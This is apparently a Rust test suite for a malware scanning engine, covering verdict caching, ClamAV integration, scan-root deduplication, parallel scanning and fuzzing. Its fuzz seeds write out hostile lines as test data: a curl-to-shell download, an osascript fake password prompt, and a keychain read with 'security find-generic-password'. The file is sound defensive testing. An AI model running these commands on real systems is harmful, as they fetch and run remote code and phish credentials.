    let mut files = Vec::new();
    let mut stack = vec![repo.clone()];
    while let Some(dir) = stack.pop() {
        for entry in std::fs::read_dir(&dir).unwrap() {
            let entry = entry.unwrap();
            let ty = entry.file_type().unwrap();
            let name = entry.file_name();
            if ty.is_dir() {
                if !SKIP_DIRS.iter().any(|s| name == *s) {
                    stack.push(entry.path());
                }
            } else if ty.is_file() {
                files.push(entry.path());
            }
        }
    }
    assert!(
        files.len() > 200,
        "walked the repository ({} files)",
        files.len()
    );

    let mut o = opts();
    o.use_ml = false;
    let cancel = AtomicBool::new(false);
    let mut flagged = Vec::new();
    e.scan_paths(&files, &o, &cancel, &mut |r| {
        if r.verdict != Verdict::Clean {
            let names: Vec<&str> = r.detections.iter().map(|d| d.name.as_str()).collect();
            flagged.push(format!(
                "{} ({:?}: {})",
                r.path,
                r.verdict,
                names.join(", ")
            ));
        }
    });
    assert!(
        flagged.is_empty(),
        "repository files flagged by our own rules:\n  {}",
        flagged.join("\n  ")
    );
}

#[derive(Default)]
struct MemVerdicts(Mutex<std::collections::HashMap<String, ScanReport>>);

impl VerdictStore for MemVerdicts {
    fn get(&self, key: &str) -> Option<ScanReport> {
        self.0.lock().unwrap().get(key).cloned()
    }
    fn put(&self, key: &str, report: &ScanReport) {
        self.0
            .lock()
            .unwrap()
            .insert(key.to_string(), report.clone());
    }
}

#[test]
fn persistent_verdicts_survive_restarts_but_not_rule_changes() {
    let f = fixture();
    install_bundle(&f.paths, &[], &[], |_| {});
    let store = Arc::new(MemVerdicts::default());
    let fresh = || {
        let e = Engine::load(&f.paths, &Config::default()).unwrap();
        e.set_verdict_store(store.clone());
        e
    };
    let clean = f.data.join("notes.sh");
    std::fs::write(&clean, b"#!/bin/sh\necho hello\n").unwrap();
    let bad = f.data.join("bad.sh");
    std::fs::write(&bad, b"#!/bin/sh\n# PARABELLUM-TEST-MARKER\n").unwrap();

    let e1 = fresh();
    let r = e1.scan_file(&clean, &opts());
    assert!(r.verdict == Verdict::Clean && !r.cached);
    assert_eq!(e1.scan_file(&bad, &opts()).verdict, Verdict::Malicious);
    assert_eq!(
        store.0.lock().unwrap().len(),
        1,
        "only the clean verdict is stored"
    );

    // "Restart": new engine, same DB → served from the store, path restored.
    let e2 = fresh();
    let r = e2.scan_file(&clean, &opts());
    assert!(r.cached && r.verdict == Verdict::Clean, "{r:?}");
    assert_eq!(r.path, clean.to_string_lossy());
    // Same bytes elsewhere (dedupe by content) → hit too.
    let copy = f.data.join("copy.sh");
    std::fs::copy(&clean, &copy).unwrap();
    assert!(e2.scan_file(&copy, &opts()).cached);
    // Same bytes, typed differently (inert text) → not the same entry.
    let as_json = f.data.join("notes.json");
    std::fs::write(&as_json, b"echo hello\n").unwrap();
    assert!(!e2.scan_file(&as_json, &opts()).cached);
    // Other options → miss.
    let mut o = opts();
    o.scan_inert_text = true;
    assert!(!e2.scan_file(&copy, &o).cached);
    // Malware never comes from the store.
    assert_eq!(e2.scan_file(&bad, &opts()).verdict, Verdict::Malicious);

    // New rules → new fingerprint → full scan again.
    let fp = e2.content_fingerprint().to_string();
    let sig = f.paths.signatures_dir().join("builtin.yar");
    let mut rules = std::fs::read(&sig).unwrap();
    rules.extend_from_slice(b"\nrule Extra { strings: $a = \"zzz-extra\" condition: $a }\n");
    std::fs::write(&sig, rules).unwrap();
    let e3 = fresh();
    assert_ne!(e3.content_fingerprint(), fp);
    assert!(!e3.scan_file(&clean, &opts()).cached);
}

/// A clean verdict reached without ClamAV (name clamscan cannot take) must not be reused for a copy
/// that ClamAV would have scanned.
#[test]
fn persistent_verdicts_require_the_clamav_answer() {
    let f = fixture();
    let mut e = Engine::load(&f.paths, &Config::default()).unwrap();
    let bin = f.data.join("fake-clamscan");
    std::fs::write(
        &bin,
        "#!/bin/sh\nif [ \"$1\" = \"--version\" ]; then echo 'ClamAV 1.4.1/1/test'; exit 0; fi\nexit 0\n",
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
    e.clamav = clamav::ClamAv::locate_in(std::iter::once(bin), &f.paths.clamav_db_dir(), None);
    e.content_fp = e.compute_content_fingerprint(None, &f.paths.signatures_dir());
    let store = Arc::new(MemVerdicts::default());
    e.set_verdict_store(store.clone());
    let mut o = opts();
    o.use_clamav = true;

    let odd = f.data.join("line\nbreak.bin");
    std::fs::write(&odd, b"same bytes").unwrap();
    assert_eq!(e.scan_file(&odd, &o).verdict, Verdict::Clean);
    assert!(
        store.0.lock().unwrap().is_empty(),
        "ClamAV skipped: not persisted"
    );

    let normal = f.data.join("normal.bin");
    std::fs::write(&normal, b"same bytes").unwrap();
    let r = e.scan_file(&normal, &o);
    assert!(r.verdict == Verdict::Clean && !r.cached);
    assert_eq!(
        store.0.lock().unwrap().len(),
        1,
        "ClamAV answered: persisted"
    );
}

/// Paths of the top-level reports (members and errors aside), sorted.
fn top_paths(reports: &[ScanReport]) -> Vec<String> {
    let mut v: Vec<String> = reports
        .iter()
        .filter(|r| !r.path.contains("!/") && r.error.is_none())
        .map(|r| r.path.clone())
        .collect();
    v.sort();
    v
}

#[test]
fn overlapping_roots_are_walked_once() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let home = f.data.join("home");
    let dl = home.join("Downloads");
    std::fs::create_dir_all(dl.join("deep")).unwrap();
    std::fs::write(home.join("a.txt"), b"a").unwrap();
    std::fs::write(dl.join("b.txt"), b"b").unwrap();
    std::fs::write(dl.join("deep/c.txt"), b"c").unwrap();
    std::os::unix::fs::symlink(&home, f.data.join("home-link")).unwrap();
    let expected = vec![
        home.join("Downloads/b.txt").to_string_lossy().into_owned(),
        home.join("Downloads/deep/c.txt")
            .to_string_lossy()
            .into_owned(),
        home.join("a.txt").to_string_lossy().into_owned(),
    ];
    for workers in [1, 4] {
        let mut o = opts();
        o.workers = workers;
        // Nested root (both orders), the same root twice, a file root inside a folder root.
        for roots in [
            vec![home.clone(), dl.clone()],
            vec![dl.clone(), home.clone()],
            vec![home.clone(), home.clone()],
            vec![home.join("a.txt"), home.clone()],
        ] {
            let (reports, totals) = collect(&e, &roots, &o);
            let mut got = top_paths(&reports);
            got.dedup();
            assert_eq!(top_paths(&reports), got, "{roots:?}: a file reported twice");
            assert_eq!(totals.files, 3, "{roots:?} ({workers} workers)");
        }
        // Same folder under another name (followed link to a root): once.
        o.follow_symlinks = true;
        let (_, totals) = collect(&e, &[home.clone(), f.data.join("home-link")], &o);
        assert_eq!(totals.files, 3, "symlinked root ({workers} workers)");
        // A link inside the tree back to its own root: not walked again.
        std::os::unix::fs::symlink(&home, dl.join("loop")).ok();
        let (reports, _) = collect(&e, std::slice::from_ref(&home), &o);
        assert_eq!(top_paths(&reports), expected, "{workers} workers");
        std::fs::remove_file(dl.join("loop")).unwrap();
    }
}

#[test]
fn parallel_scan_matches_serial_scan() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let root = f.data.join("tree");
    for i in 0..60 {
        let d = root.join(format!("d{}", i % 7));
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join(format!("f{i}.txt")), format!("file {i}")).unwrap();
    }
    std::fs::write(root.join("d3/eicar.com"), EICAR).unwrap();
    std::fs::write(
        root.join("d5/pack.zip"),
        zip_bytes(&[("inner/eicar.com", EICAR, true), ("ok.txt", b"ok", false)]),
    )
    .unwrap();
    std::fs::write(root.join("d1/big.bin"), vec![0u8; 9 * 1024 * 1024]).unwrap();

    let serial = collect(&e, std::slice::from_ref(&root), &opts());
    // Fresh engine: no scan-cache hits (a cached container reports no members).
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let mut o = opts();
    o.workers = 4;
    let parallel = collect(&e, std::slice::from_ref(&root), &o);
    assert_eq!(top_paths(&serial.0), top_paths(&parallel.0));
    assert_eq!(serial.1.files, parallel.1.files);
    assert_eq!(serial.1.threats, parallel.1.threats);
    assert_eq!(parallel.1.threats, 2, "{:?}", parallel.1);
    assert_eq!(serial.1.bytes, parallel.1.bytes);
    // Container members are still delivered before their container, on the caller's thread.
    let zip = root.join("d5/pack.zip").to_string_lossy().into_owned();
    let pos = |pred: &dyn Fn(&ScanReport) -> bool| parallel.0.iter().position(pred).unwrap();
    assert!(pos(&|r| r.path.starts_with(&format!("{zip}!/"))) < pos(&|r| r.path == zip));

    // Cancelled from the report callback: stops early, no hang.
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let cancel = AtomicBool::new(false);
    let mut seen = 0;
    let t = e.scan_paths(std::slice::from_ref(&root), &o, &cancel, &mut |_| {
        seen += 1;
        if seen == 5 {
            cancel.store(true, std::sync::atomic::Ordering::SeqCst);
        }
    });
    assert!(t.cancelled);
    assert!(t.files < serial.1.files, "{t:?}");
}

#[test]
fn heavy_files_and_worker_counts() {
    assert!(crate::walk::is_heavy(Path::new("/x/a.DMG"), 10));
    assert!(crate::walk::is_heavy(
        Path::new("/x/a.bin"),
        8 * 1024 * 1024
    ));
    assert!(!crate::walk::is_heavy(Path::new("/x/a.sh"), 4096));
    let n = auto_workers();
    assert!((1..=crate::walk::MAX_AUTO_WORKERS).contains(&n));
}

/// Hostile files are parsed by the root daemon (ZIP / tar / gzip expansion, Mach-O, YARA-X, ML features):
/// mutated containers and binaries must give a report, never a panic or a hang. Deterministic
/// (xorshift); `PB_FUZZ_ITERS` raises the count (default 400: the engine is heavier than the parsers
/// fuzzed in pb-monitor/tests/robustness.rs).
#[test]
fn engine_survives_mutated_containers_and_binaries() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gz.write_all(EICAR).unwrap();
    let gz = gz.finish().unwrap();
    let mut tarball = tar::Builder::new(Vec::new());
    let mut h = tar::Header::new_gnu();
    h.set_size(EICAR.len() as u64);
    h.set_cksum();
    tarball.append_data(&mut h, "eicar.com", EICAR).unwrap();
    let tarball = tarball.into_inner().unwrap();
    let inner = zip_bytes(&[("eicar.com", EICAR, false)]);
    let mut macho = vec![
        0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01, 0, 0, 0, 0, 2, 0, 0, 0,
    ];
    macho.extend_from_slice(&[0u8; 64]);
    macho.extend_from_slice(b"/usr/lib/libSystem.B.dylib\0security find-generic-password\0");
    let seeds: Vec<Vec<u8>> = vec![
        zip_bytes(&[("a.txt", b"hello", true), ("b/eicar.com", EICAR, false)]),
        zip_bytes(&[("inner.zip", &inner, true)]),
        gz,
        tarball,
        macho,
        b"#!/bin/sh\ncurl -fsSL http://x | sh\nosascript -e 'display dialog \"pw\" default answer \"\" with hidden answer'\n".to_vec(),
        br#"<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>x</string></dict></plist>"#.to_vec(),
    ];
    let iters: usize = std::env::var("PB_FUZZ_ITERS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(400);
    let mut state: u64 = 0x5DEE_CE66_D1CE_4E5B;
    let mut rnd = move |n: usize| -> usize {
        state ^= state >> 12;
        state ^= state << 25;
        state ^= state >> 27;
        (state.wrapping_mul(0x2545_F491_4F6C_DD1D) % n.max(1) as u64) as usize
    };
    let names = ["x.zip", "x.gz", "x.tar", "x.bin", "x.sh", "x.plist", "x"];
    for i in 0..seeds.len() + iters {
        let mut buf = seeds[i % seeds.len()].clone();
        if i >= seeds.len() {
            for _ in 0..=rnd(6) {
                let len = buf.len();
                match rnd(5) {
                    0 if len > 0 => {
                        let j = rnd(len);
                        buf[j] ^= 1 << rnd(8);
                    }
                    1 if len > 0 => {
                        let j = rnd(len);
                        buf[j] = [0x00, 0xff, 0x7f, 0x80][rnd(4)];
                    }
                    2 if len > 0 => buf.truncate(rnd(len)),
                    3 => {
                        let j = rnd(len + 1);
                        let other = seeds[rnd(seeds.len())].clone();
                        buf.splice(j..j, other);
                    }
                    _ => buf.extend((0..rnd(512)).map(|_| rnd(256) as u8)),
                }
            }
        }
        let p = f.data.join(names[i % names.len()]);
        std::fs::write(&p, &buf).unwrap();
        let start = std::time::Instant::now();
        let r = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| e.scan_file(&p, &opts())));
        if r.is_err() {
            let dump = std::env::temp_dir().join(format!("pb-engine-fuzz-{i}.bin"));
            let _ = std::fs::write(&dump, &buf);
            panic!(
                "engine panicked on input #{i} (saved to {})",
                dump.display()
            );
        }
        assert!(
            start.elapsed() < std::time::Duration::from_secs(10),
            "input #{i} took {:?}",
            start.elapsed()
        );
    }
}

/// Audit FILE-1: an 8 EiB sparse file (`truncate -s 8E`) must not be read in full (it kept both
/// real-time slots busy for years). Partial fingerprint, never cached, done in well under a second.
#[test]
fn huge_sparse_file_gets_a_partial_fingerprint_fast() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let p = f.data.join("sparse.bin");
    let file = std::fs::File::create(&p).unwrap();
    // Largest size the test filesystem accepts, at least 64 GiB.
    let mut size = 1u64 << 62;
    while file.set_len(size).is_err() {
        size >>= 1;
        assert!(size >= 1 << 36, "filesystem refuses sparse files");
    }
    drop(file);
    let start = std::time::Instant::now();
    let r = e.scan_file(&p, &opts());
    assert!(
        start.elapsed() < std::time::Duration::from_secs(5),
        "{:?}",
        start.elapsed()
    );
    assert_eq!(r.size, size);
    assert!(
        r.error
            .as_deref()
            .unwrap_or("")
            .contains("partial fingerprint"),
        "{:?}",
        r.error
    );
    assert!(!r.cached);
}
